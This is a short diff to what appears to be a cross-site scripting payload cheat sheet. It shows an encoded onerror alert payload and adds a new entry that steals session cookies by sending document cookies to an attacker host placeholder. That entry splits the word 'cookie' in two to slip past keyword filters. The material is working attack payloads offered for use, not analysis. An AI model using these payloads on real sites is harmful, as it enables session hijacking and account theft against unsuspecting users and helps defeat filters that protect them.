@@ -34,3 +34,7 @@ Decimal encoding for 'a'
 
     <img src=x onerror=&#97;lert(1)>
 
+### 5) Steal cookie by not directly using sensitive words in JS like "cookie" for example
+
+    <script>var i=new Image();i.src="http://<attacker_ip>:<port>/?c="+document["coo"+"kie"]</script>
+
